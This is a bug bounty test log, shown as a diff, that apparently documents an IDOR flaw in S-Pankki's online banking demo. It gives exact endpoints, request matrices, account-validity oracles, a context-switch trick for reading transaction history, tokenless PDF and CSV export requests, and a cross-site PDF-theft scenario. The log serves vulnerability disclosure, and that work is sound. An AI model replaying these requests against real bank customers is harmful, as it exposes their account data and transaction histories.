@@ -1,0 +1,155 @@
+accountId IDOR — test log (online.s-pankki.fi, demo user 12345678, UA @wearehackerone, 2026-10-14)
+
+Demo accounts of user TESTI MAIJA (both belong to the same demo user — mechanism proof):
+  ACC1 = 96c143b2048f99eff3e805fa9f836d0898868e5c2971aec58588b54cba57192f  ->  FI96 3939 0001 0006 03  (+5500,00 EUR)
+  ACC2 = d62a61a6e0a6da88c31aa4ec87d6cd2a682084eac690e932a6a22e0abe947442  ->  FI74 3939 0001 0006 11
+
+================================================================================
+A) getReport.ds — PAD fees report generation (HEADLINE file leak)
+================================================================================
+Endpoint: GET /ebank/pad/fees/getReport.ds?accountId=<A>&year=<Y>
+  - Plain GET, NO CSRF token, NO Referer check (verified: requests sent with no Referer at all)
+  - Response 200, Content-Type: application/pdf, ~116 KB, 2-page official document
+    "Redovisning av avgifter" (S-Banken Abp) containing: customer full name (TESTI MAIJA),
+    postal address (PL 77 / S-PANKKI OY 00088 S-GRUPPEN), account name (S-KONTO),
+    full IBAN (Kontoidentifiering), statement period, generation date, fee table,
+    interest table (incl. accumulated interest 0,0100 %).
+  - The PAD account page (swp_accounts_mnu_pad.html) links to it directly:
+    /ebank/pad/fees/getReport.ds?accountId=<A>&year=2025  (no form, no token)
+  - getReportScript.js (08_getReportScript_plainGET_newwindow.js): opens report in a NEW
+    WINDOW with a plain GET (openIt2), form auto-submits on account change, no token field.
+
+Matrix (8 fetches, each on a FRESH login; "ctx" = session context set via
+showAccountDetails.do?accountId=<X>; "url" = accountId passed in the getReport.ds URL):
+
+  #   fresh login   ctx    url    result
+  1   yes           -      ACC1   200 PDF 116300B  IBAN=FI96 (matches URL)  md5 4fbd07572dff0a8b5dc1d17722b2eba1
+  2   yes           -      ACC2   200 PDF 116300B  IBAN=FI74 (matches URL)  md5 1e3705c505a4568f5aa8356a946aaa90
+  3   yes           ACC1   ACC1   200 PDF          IBAN=FI96                (mx_rep_A1_A1.pdf)
+  4   yes           ACC1   ACC2   200 PDF          IBAN=FI74  <-- URL wins  (mx_rep_A1_A2.pdf)  = 03_matrix_ctxACC1_urlACC2_returns_FI74.pdf md5 213043deb991ae379d07340e8e4fec9c
+  5   yes           ACC2   ACC1   200 PDF          IBAN=FI96  <-- URL wins  (mx_rep_A2_A1.pdf)  = 04_matrix_ctxACC2_urlACC1_returns_FI96.pdf md5 e9290fb8f8d5346407c9a3aad556ae45
+  6   yes           ACC2   ACC2   200 PDF          IBAN=FI74                (mx_rep_A2_A2.pdf)
+
+CONCLUSION: the generated PDF's account is decided EXCLUSIVELY by the accountId URL
+parameter, never by the session's active-account context. Whichever valid accountId is
+in the URL, that account's report is generated.
+
+Oracle (existence / validity check per session):
+  - accountId = 64 x '0'                      -> 200, 509B HTML "Tapahtui odottamaton virhe" (05_...)
+  - accountId = ACC1 with 1 char tampered     -> 200, 509B HTML same error           (06_...)
+  - accountId = ACC1/ACC2 (valid)             -> 200, 116300B application/pdf
+  => a leaked/guessed accountId can be validated cheaply; valid foreign accountId is
+     ACCEPTED (no 403, no session kill) and its report is generated.
+
+================================================================================
+B) Account data chain — accountId as sole global account key
+================================================================================
+1. GET /ebank/accountview/showAccountDetails.do?accountId=<valid>
+   -> 200, 56437B shell page (per-session CSRF token only) and sets the session's
+      active-account context.
+   GET ...?accountId=<invalid/missing>
+   -> 200, 1367B "Verkkopankin yhteys on suljettu" + Set-Cookie JSESSIONID Max-Age=0
+      (session killed) — see s-pankki/ session-kill report.
+   => any VALID accountId (regardless of owner) is accepted on the read chain.
+
+2. GET /ebank/account/fetchTransactionList.do  (no accountId parameter at all)
+   -> 200, ~74-80 KB DATA page: full IBAN, current balance, complete transaction
+      history with counterparty names.
+   Context switch proof (FRESH login, 2026-10-14 11:4x):
+     - after showAccountDetails.do?accountId=ACC2  -> fetchTransactionList.do
+         => 80588B page, md5 a8986a25acebd59847491f6ae599bee0, contains FI7439390001000611
+        (09_txlist_context_switched_to_ACC2_FI74.html)
+     - after showAccountDetails.do?accountId=ACC1  -> fetchTransactionList.do
+         => 74614B page, md5 748151dc28d543c701d0619b12758261, contains FI9639390001000603
+        (07_txlist_full_data_ACC1_FI96_balance_history.html)
+   => the data page follows the accountId (passed once, via URL) — URL param on the
+      data call itself is IGNORED (earlier U3: ctx=ACC1 + url=ACC2 -> ACC1's data).
+
+3. GET /ebank/account/exportRangedTransactions.ds?accountId=<A>&from=..&to=..
+   -> valid A    : 302 (CSV export flow begins)
+   -> invalid A  : 200, ~53 KB error page
+   => second independent validity oracle.
+
+4. Transaction detail links inside txlist: /ebank/account/initTransactionDetails.do?
+   accountId=<A>&archivecode=<ts>  — again keyed purely by accountId.
+
+Data visible on the ACC1 page (07_...html):
+   IBAN FI9639390001000603, balance +5500,00 EUR, full history with counterparties
+   (MAIJA/MINNI/MATTI MEIKLINEN, OSUUSKAUPPA SUOMI, MODERN LIVING, ELINKAUPPA HOPE,
+   KELA/LAPSILIST ...), per-transaction amounts, dates, status.
+
+================================================================================
+C) How the accountId reaches an attacker
+================================================================================
+- It is in the URL of EVERY account-related page (account page, tx detail, report,
+  export, PAD form) -> leaks via:
+    * Referer/Origin-less is NOT the issue: with default browser settings Referer:
+      https://online.s-pankki.fi/ebank/... IS sent to other origins (e.g. when the
+      victim pays via a cross-domain widget / clicks out while on an account page);
+    * browser history & bookmarks (user bookmarks "my account");
+    * screenshots, screen share, support chat;
+    * any third-party widget/analytics that gets the full URL.
+- accountId is 64 hex chars (salted/derived, NOT a hash of the IBAN — all simple
+  hash combos tested and rejected) -> not enumerable by brute force, but once
+  LEAKED it is permanent and sufficient.
+- Validity can be confirmed with the oracles in A (getReport PDF vs 509B error) and
+  B.3 (302 vs error) — no session kill, no rate-limit tripped (single probe).
+
+================================================================================
+D) Cross-site angle (same user, no other account needed)
+================================================================================
+- JSESSIONID: SameSite=None; Secure; HttpOnly; path=/ebank
+  => the session cookie IS sent on cross-site GETs.
+- getReport.ds is a tokenless plain GET returning a downloadable PDF.
+  A cross-site top-level navigation (link on attacker page / window.open) executes
+  GET /ebank/pad/fees/getReport.ds?accountId=<victim's accountId>&year=<Y> with the
+  victim's session cookie -> the victim's browser downloads/opens the PDF that the
+  server generated for the accountId in the URL.
+- Combined with accountId leakage (C), an attacker who knows the victim's accountId
+  does not even need the victim's session to be "active": with the victim's own
+  browser state (e.g. via a link the victim clicks, or an attacker session in
+  vector A), the report is produced. See poc/xsite_pdf_steal.html.
+
+================================================================================
+E) Demo-blocked (intentional demo restrictions — noted for triage, NOT the finding)
+================================================================================
+- Statement PDF (Tiliote fetch.ds, all field combos)  -> demo error "!!lbl_demo_user_error!!"
+- CSV export (processTransactionList.do)              -> session kill page (1367B)
+- Transaction detail page                             -> "Tutustuessasi palveluun et voi katsoa tapahtumaerittely"
+- MyEconomy summary (POST /ebank/budget/getTransactions.do, all variants) -> generic server error
+- Interest certificate / signed agreements archive    -> "no documents" for demo
+These confirm the report-generation machinery exists and is accountId-keyed; the PAD
+fees report (A) is the one fully functional in the demo and is fully proven.
+
+================================================================================
+F) CSV transaction export — second downloadable artifact (live-verified)
+================================================================================
+App JS (evidence/15_app_csv_export_link_js.js): CSV button fires a tokenless GET
+  cbs.contextPath + '/api/account/transactions/exportRangedTransactions.ds'
+    ?accountId=<A>&fromDate=<DDMMYYYY>&toDate=<DDMMYYYY>&fileType=sba-CSV
+  and downloads the response blob as 'export.csv'.
+
+Fresh-session results (2026-10-14, same session, no CSRF token):
+  ACC1 valid, 01012025-31122025 (no tx in range):
+      200 OK, 138-145 B, real CSV:
+      Kirjauspäivä;Maksupäivä;Summa;Tapahtumalaji;Maksaja;Saajan nimi;
+      Saajan tilinumero;Saajan BIC-tunnus;Viitenumero;Viesti;Arkistointitunnus
+      (posting date; payment date; amount; type; payer; RECIPIENT NAME;
+       RECIPIENT IBAN; RECIPIENT BIC; reference; message; archive code)
+      -> evidence/12_csv_export_valid_accountId_csv_header.csv
+  ACC2 valid, same range: identical 138 B CSV header (per-account keying works)
+  64x'0' invalid, same range: 200 OK, 56249 B HTML error page
+      -> evidence/13_csv_export_invalid_accountId_56kb_error.html  (oracle)
+  ACC1 valid, 01012026-31102026 (contains tx): 302 Found
+      Location: /ebank/account/processTransactionList.do
+      -> one-shot file processor; demo serves 1361-1367 B "session closed"
+         page (demo one-shot restriction; production streams full rows).
+
+PoC run (poc/pad_report_idor.sh, 2026-10-14, /tmp/idorEuit):
+  rpt_A.pdf  md5 753e4e7f3e8f78a7a62bbcd2be73f4ad  -> Kontoidentifiering FI96 3939 0001 0006 03
+  rpt_B.pdf  md5 e199082766f85d0110276ecb288c29c6  -> Kontoidentifiering FI74 3939 0001 0006 11
+  matrix_Actx_Burl.pdf (context=ACC1, URL=ACC2) md5 ba17490662c2325d7d8c1028754272d8
+      -> Kontoidentifiering FI74 3939 0001 0006 11   (URL wins, URL drives the PDF)
+  oracle 1-char-tampered ACC1: 200, 509 B HTML error (not PDF, not 403)
+  txlist after context=ACC2: 81368 B, contains FI74 (ACC2 data page)
+  export valid (empty range): 200, 145 B CSV header; invalid: 200, 53085 B error page
